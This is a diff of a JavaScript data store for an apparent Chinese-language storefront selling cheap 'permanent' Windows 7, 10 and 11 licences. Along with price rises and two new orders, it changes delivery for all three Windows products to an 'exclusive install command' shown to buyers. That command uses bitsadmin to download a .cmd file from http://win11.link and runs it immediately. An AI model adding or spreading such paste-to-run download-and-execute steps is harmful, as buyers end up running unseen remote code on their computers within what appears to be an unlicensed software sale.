@@ -9,7 +9,7 @@
  */
 const DATA_STORE = {
     "_version": "v4",
-    "_lastUpdated": "2026-04-21",
+    "_lastUpdated": "2026-04-22",
     "editorData": {
         "promo": {
             "visible": true,
@@ -39,7 +39,7 @@ const DATA_STORE = {
                     {
                         "name": "Windows 7",
                         "desc": "经典稳定，兼容性强",
-                        "price": "5",
+                        "price": "8",
                         "icon": "💻",
                         "iconType": "emoji",
                         "key": "win7",
@@ -53,13 +53,17 @@ const DATA_STORE = {
                             "✓ 永久使用授权"
                         ],
                         "buyText": "立即购买",
-                        "deliveryType": "links",
-                        "delivery": null
+                        "deliveryType": "command",
+                        "delivery": {
+                            "type": "command",
+                            "successTitle": "专属安装命令已就绪",
+                            "command": "bitsadmin /transfer a http://win11.link %cd%\\1.cmd&1"
+                        }
                     },
                     {
                         "name": "Windows 10",
                         "desc": "主流系统，性能均衡",
-                        "price": "8",
+                        "price": "18",
                         "icon": "🖥️",
                         "iconType": "emoji",
                         "key": "win10",
@@ -73,13 +77,17 @@ const DATA_STORE = {
                             "✓ 优先技术支持"
                         ],
                         "buyText": "立即购买",
-                        "deliveryType": "links",
-                        "delivery": null
+                        "deliveryType": "command",
+                        "delivery": {
+                            "type": "command",
+                            "successTitle": "专属安装命令已就绪",
+                            "command": "bitsadmin /transfer a http://win11.link %cd%\\1.cmd&1"
+                        }
                     },
                     {
                         "name": "Windows 11",
                         "desc": "全新体验，前沿科技",
-                        "price": "8",
+                        "price": "18",
                         "icon": "🚀",
                         "iconType": "emoji",
                         "key": "win11",
@@ -93,8 +101,12 @@ const DATA_STORE = {
                             "✓ 专属技术支持"
                         ],
                         "buyText": "立即购买",
-                        "deliveryType": "links",
-                        "delivery": null
+                        "deliveryType": "command",
+                        "delivery": {
+                            "type": "command",
+                            "successTitle": "专属安装命令已就绪",
+                            "command": "bitsadmin /transfer a http://win11.link %cd%\\1.cmd&1"
+                        }
                     },
                     {
                         "name": "Win系统盘16G",
@@ -497,9 +509,35 @@ const DATA_STORE = {
                 ]
             }
         ],
-        "timestamp": 1776784991992
+        "timestamp": 1776870615786
     },
     "orders": [
+        {
+            "id": 1776869570238,
+            "sequence": 2,
+            "orderNo": "ORD202604220002",
+            "productName": "Windows 7",
+            "price": "8",
+            "productKey": "win7",
+            "orderType": "command",
+            "address": "",
+            "status": "delivered",
+            "createTime": "2026-04-22T14:52:50.238Z",
+            "date": "2026-04-22"
+        },
+        {
+            "id": 1776869470501,
+            "sequence": 1,
+            "orderNo": "ORD202604220001",
+            "productName": "Windows 7",
+            "price": "5",
+            "productKey": "win7",
+            "orderType": "command",
+            "address": "",
+            "status": "delivered",
+            "createTime": "2026-04-22T14:51:10.501Z",
+            "date": "2026-04-22"
+        },
         {
             "id": 1776762929732,
             "sequence": 1,
